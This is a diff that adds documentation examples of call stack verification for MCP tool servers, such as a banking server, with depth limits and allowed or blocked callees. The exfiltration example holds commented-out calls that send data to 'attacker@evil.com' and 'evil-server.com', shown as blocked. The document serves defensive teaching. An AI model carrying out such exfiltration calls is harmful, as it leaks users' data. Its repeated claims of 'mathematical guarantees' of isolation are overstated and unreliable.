@@ -1056,4 +1056,304 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-``` 
+```
+
+## Call Stack Verification Examples
+
+Call stack verification provides real-time protection against privilege escalation, unauthorized function calls, and deep call chain attacks. Here are practical examples of implementing call stack security.
+
+### Basic Call Stack Protection
+
+```python
+from mcp.server.fastmcp import FastMCP
+
+app = FastMCP("Secure Banking Server")
+
+# Read-only tool with call stack protection
+@app.tool(etdi=True,
+          etdi_permissions=['banking:read'],
+          etdi_max_call_depth=2,                    # Maximum 2 levels deep
+          etdi_blocked_callees=['transfer_money'])  # Cannot call transfer functions
+def get_account_balance(account_id: str) -> str:
+    """Get account balance - secured against privilege escalation"""
+    balance = database.get_balance(account_id)
+    
+    # This would be blocked by call stack verification:
+    # transfer_money(account_id, "attacker", balance)  # ❌ BLOCKED
+    
+    return f"Account {account_id} balance: ${balance}"
+
+# High-privilege tool with strict isolation
+@app.tool(etdi=True,
+          etdi_permissions=['banking:write'],
+          etdi_max_call_depth=1,        # No nested calls allowed
+          etdi_allowed_callees=[])      # Cannot call any other functions
+def transfer_money(from_account: str, to_account: str, amount: float) -> str:
+    """Transfer money - completely isolated for security"""
+    # Perform transfer logic here
+    return f"Transferred ${amount} from {from_account} to {to_account}"
+```
+
+### Preventing Data Exfiltration
+
+```python
+# Data processing tool that cannot exfiltrate data
+@app.tool(etdi=True,
+          etdi_permissions=['data:process'],
+          etdi_max_call_depth=3,
+          etdi_allowed_callees=['validate_data', 'format_output', 'log_action'],
+          etdi_blocked_callees=['send_email', 'upload_file', 'external_api'])
+def process_sensitive_data(data: str) -> str:
+    """Process sensitive data without exfiltration risk"""
+    
+    # These calls are allowed
+    validate_data(data)           # ✅ ALLOWED
+    processed = analyze_data(data)
+    formatted = format_output(processed)
+    log_action("Data processed")  # ✅ ALLOWED
+    
+    # These would be blocked:
+    # send_email("attacker@evil.com", processed)  # ❌ BLOCKED
+    # upload_file("evil-server.com", processed)   # ❌ BLOCKED
+    
+    return formatted
+
+@app.tool()
+def validate_data(data: str) -> bool:
+    """Validation helper - can be called by processing tools"""
+    return len(data) > 0
+
+@app.tool()
+def log_action(action: str) -> None:
+    """Logging helper - can be called by processing tools"""
+    print(f"LOG: {action}")
+```
+
+### Controlled Workflow Chains
+
+```python
+# Workflow orchestrator with controlled call chains
+@app.tool(etdi=True,
+          etdi_permissions=['workflow:execute'],
+          etdi_max_call_depth=5,                    # Allow workflow chains
+          etdi_allowed_callees=['step1', 'step2', 'step3', 'log_workflow'],
+          etdi_blocked_callees=['admin_functions', 'external_apis'])
+def workflow_orchestrator(workflow_id: str) -> str:
+    """Execute workflow with controlled call chain"""
+    
+    log_workflow(f"Starting workflow {workflow_id}")
+    
+    # Execute workflow steps in sequence
+    result1 = step1()         # ✅ ALLOWED
+    result2 = step2(result1)  # ✅ ALLOWED
+    result3 = step3(result2)  # ✅ ALLOWED
+    
+    # This would be blocked:
+    # admin_reset_system()    # ❌ BLOCKED
+    
+    log_workflow(f"Completed workflow {workflow_id}")
+    return f"Workflow {workflow_id} completed successfully"
+
+@app.tool()
+def step1() -> str:
+    return "Step 1 completed"
+
+@app.tool()
+def step2(input_data: str) -> str:
+    return f"Step 2 processed: {input_data}"
+
+@app.tool()
+def step3(input_data: str) -> str:
+    return f"Step 3 finalized: {input_data}"
+```
+
+### Admin Function Protection
+
+```python
+# Ultra-secure admin function - completely isolated
+@app.tool(etdi=True,
+          etdi_permissions=['admin:execute'],
+          etdi_max_call_depth=1,        # No nested calls
+          etdi_allowed_callees=[],      # Cannot call anything
+          etdi_blocked_callees=['*'])   # Block everything
+def admin_reset_system() -> str:
+    """Admin function with maximum isolation"""
+    # This function cannot call any other functions
+    # Provides mathematical guarantee of isolation
+    return "System reset completed"
+
+# Admin function with limited logging
+@app.tool(etdi=True,
+          etdi_permissions=['admin:manage'],
+          etdi_max_call_depth=2,
+          etdi_allowed_callees=['audit_log'],  # Only logging allowed
+          etdi_blocked_callees=['transfer_money', 'external_api'])
+def admin_manage_users(action: str, user_id: str) -> str:
+    """Admin user management with audit logging"""
+    
+    audit_log(f"Admin action: {action} for user {user_id}")  # ✅ ALLOWED
+    
+    # Perform admin action
+    if action == "disable":
+        # Disable user logic
+        result = f"User {user_id} disabled"
+    elif action == "enable":
+        # Enable user logic
+        result = f"User {user_id} enabled"
+    else:
+        result = f"Unknown action: {action}"
+    
+    audit_log(f"Admin action completed: {result}")  # ✅ ALLOWED
+    
+    # This would be blocked:
+    # transfer_money(user_id, "admin", 1000)  # ❌ BLOCKED
+    
+    return result
+
+@app.tool()
+def audit_log(message: str) -> None:
+    """Audit logging - can be called by admin functions"""
+    timestamp = datetime.now().isoformat()
+    print(f"AUDIT [{timestamp}]: {message}")
+```
+
+### Preventing Circular Calls
+
+```python
+# Tool that could create circular calls
+@app.tool(etdi=True,
+          etdi_permissions=['data:transform'],
+          etdi_max_call_depth=3)
+def transform_data(data: str, level: int = 0) -> str:
+    """Data transformation with circular call protection"""
+    
+    if level < 2:
+        # This is allowed up to max depth
+        return transform_data(f"transformed-{data}", level + 1)  # ✅ ALLOWED
+    
+    # This would be blocked at max depth:
+    # return transform_data(f"over-transformed-{data}", level + 1)  # ❌ BLOCKED
+    
+    return f"Final: {data}"
+
+# Tool that tries to call itself (blocked)
+@app.tool(etdi=True,
+          etdi_permissions=['process:recursive'])
+def recursive_processor(data: str) -> str:
+    """Recursive processor - circular calls blocked"""
+    
+    if len(data) > 10:
+        # This would create a circular call and be blocked:
+        # return recursive_processor(data[:-1])  # ❌ BLOCKED (circular)
+        pass
+    
+    return f"Processed: {data}"
+```
+
+### Security Event Monitoring
+
+```python
+from mcp.etdi.events import get_event_emitter, EventType
+
+# Set up event monitoring for call stack violations
+emitter = get_event_emitter()
+
+def on_call_depth_exceeded(event):
+    print(f"🚨 SECURITY ALERT: Call depth exceeded")
+    print(f"   Tool: {event.data['tool_id']}")
+    print(f"   Current depth: {event.data['current_depth']}")
+    print(f"   Max allowed: {event.data['max_allowed']}")
+    print(f"   Call stack: {event.data['call_stack']}")
+
+def on_privilege_escalation(event):
+    print(f"🚨 CRITICAL ALERT: Privilege escalation detected")
+    print(f"   Caller: {event.data['caller_tool']}")
+    print(f"   Attempted callee: {event.data['attempted_callee']}")
+    print(f"   Caller permissions: {event.data['caller_permissions']}")
+
+def on_unauthorized_call(event):
+    print(f"🚨 SECURITY ALERT: Unauthorized function call")
+    print(f"   Tool: {event.data['tool_id']}")
+    print(f"   Blocked function: {event.data['blocked_function']}")
+
+# Register event listeners
+emitter.on(EventType.CALL_DEPTH_EXCEEDED, on_call_depth_exceeded)
+emitter.on(EventType.PRIVILEGE_ESCALATION_DETECTED, on_privilege_escalation)
+emitter.on(EventType.SECURITY_VIOLATION, on_unauthorized_call)
+```
+
+### Configuration Strategies
+
+```python
+# High-security configuration for financial tools
+FINANCIAL_SECURITY = {
+    "etdi": True,
+    "etdi_permissions": ["banking:read"],
+    "etdi_max_call_depth": 1,           # No nested calls
+    "etdi_allowed_callees": [],         # Cannot call anything
+    "etdi_blocked_callees": ["*"]       # Block everything
+}
+
+# Medium-security configuration for business logic
+BUSINESS_SECURITY = {
+    "etdi": True,
+    "etdi_permissions": ["business:process"],
+    "etdi_max_call_depth": 3,           # Limited nesting
+    "etdi_allowed_callees": ["validate", "log", "format"],
+    "etdi_blocked_callees": ["admin", "transfer", "delete"]
+}
+
+# Low-security configuration for read-only operations
+READONLY_SECURITY = {
+    "etdi": True,
+    "etdi_permissions": ["data:read"],
+    "etdi_max_call_depth": 5,           # More flexibility
+    "etdi_allowed_callees": ["format", "validate", "log", "cache"],
+    "etdi_blocked_callees": ["write", "delete", "modify", "send"]
+}
+
+# Apply configurations
+@app.tool(**FINANCIAL_SECURITY)
+def get_account_balance(account_id: str) -> str:
+    return f"Balance: $1000"
+
+@app.tool(**BUSINESS_SECURITY)
+def process_order(order_data: dict) -> str:
+    validate(order_data)
+    return "Order processed"
+
+@app.tool(**READONLY_SECURITY)
+def get_user_profile(user_id: str) -> dict:
+    data = fetch_user_data(user_id)
+    return format(data)
+```
+
+### Integration with Existing MCP Servers
+
+```python
+# Gradually add call stack security to existing MCP server
+from mcp.server.fastmcp import FastMCP
+
+app = FastMCP("Legacy Banking Server")
+
+# Existing tool without ETDI (backward compatible)
+@app.tool()
+def legacy_balance_check(account_id: str) -> str:
+    """Legacy tool - no call stack protection"""
+    return f"Legacy balance: $1000"
+
+# Same tool with ETDI security added
+@app.tool(etdi=True,
+          etdi_permissions=['banking:read'],
+          etdi_max_call_depth=2,
+          etdi_blocked_callees=['transfer_money'])
+def secure_balance_check(account_id: str) -> str:
+    """Secured version - with call stack protection"""
+    return f"Secure balance: $1000"
+
+# Clients can choose which version to use
+# Legacy clients use legacy_balance_check
+# ETDI clients use secure_balance_check
+```
+
+These examples demonstrate how call stack verification provides mathematical guarantees that tools cannot exceed their defined security boundaries, preventing entire classes of attacks that traditional security approaches cannot detect.
